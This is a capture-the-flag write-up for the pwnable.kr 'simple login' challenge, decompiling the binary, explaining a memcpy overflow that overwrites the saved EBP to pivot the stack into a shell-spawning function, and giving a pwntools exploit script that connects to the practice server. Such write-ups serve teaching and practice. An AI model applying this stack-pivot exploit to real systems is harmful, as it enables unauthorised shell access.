# simple login

## Description

simple login - 50 pt

> Can you get authentication from this server? <br><br>
> Download : http://pwnable.kr/bin/login <br><br>
> Running at : nc pwnable.kr 9003


## Solution

### Understanding the binary

As stated in the description, we are given a binary file. Let's start by checking what kind of file it is:

```bash
$ file login
login: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=e09ec7145440153c4b3dedc3c7a8e328d9be6b55, not stripped
```

Nothing special here, it's a 32-bit ELF executable. Here is the decompilation provided by IDA:

**main:**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-3Ch]
  int v5; // [esp+18h] [ebp-28h] BYREF
  _BYTE v6[30]; // [esp+1Eh] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-4h]

  memset(v6, 0, sizeof(v6));
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ", v4);
  _isoc99_scanf("%30s", v6);
  memset(&input, 0, 12);
  v5 = 0;
  v7 = Base64Decode(v6, &v5);
  if ( v7 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v5, v7);
    if ( auth(v7) == 1 )
      correct();
  }
  return 0;
}
```

**auth:**
```c
BOOL __cdecl auth(int a1)
{
  char v2[8]; // [esp+14h] [ebp-14h] BYREF
  const char *v3; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h] BYREF

  memcpy(&v4, &input, a1);
  v3 = (const char *)calc_md5(v2, 12);
  printf("hash : %s\n", v3);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", v3) == 0;
}
```

**correct:**
```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```

So, the program reads 30 bytes from the user, decodes them from base64, and initializes `input` to 0. Then, if the length of the decoded string is less or equal to 12 bytes, it copies it to `input` and calls the `auth` function. 

The `auth` function copies `input` to a local variable, and then calls the `calc_md5` function on it. It then compares the result to the string `f87cd601aa7fedca99018a8be88eda34`. If the comparison is successful, it calls the `correct` function.

The `correct` function checks if `input` (or being more precise, it's first four bytes) is equal to `-559038737`. If it is, it prints the flag and calls `system("/bin/sh")`.

### Exploit

Note that when `input` is copied a local variable using `memcpy`, the program copies 12 bytes into a 4 byte long variable. Debugging with gdb, it appears that the local variable is 8 bytes above the pushed ebp on the stack - which means that it'll overwritten with the last 4 bytes of `input`.

You surely ask "Okay, how does modifying the saved ebp help us?". Well, consider if the saved ebp points somewhere where the address of  `correct` is saved. When the program will return to main, and the `leave` instruction will be executed, then esp will too point to the address of `correct`. Thus, when the `ret` instruction will be executed, the program will jump to the `correct` function. 

It's important to note that after moving ebp to esp, `leave` also pops the saved ebp from the stack - causing esp to be incremented by 4, and so we technically need to make rbp point to the 4 bytes behind the address of `correct`.

We can achieve this by making `input` look like this:

```
| 0xdeadbeef | address of correct | ptr to last cell minus 4 |
                    ^                         |
                    |_________________________|
```

### Exploit code

```python
from pwn import *

'''
0x0804925f: correct
0x0811eb44: 5th byte of input
'''
payload = p32(0xdeadbeef) + p32(0x0804925f) + p32(0x0811eb44 - 4) 

conn = remote('pwnable.kr', 9003)
conn.sendline(base64.b64encode(payload)) # don't forget to encode the payload!
conn.interactive()
```

```
control EBP, control ESP, control EIP, control the world~
```

Wise words, indeed.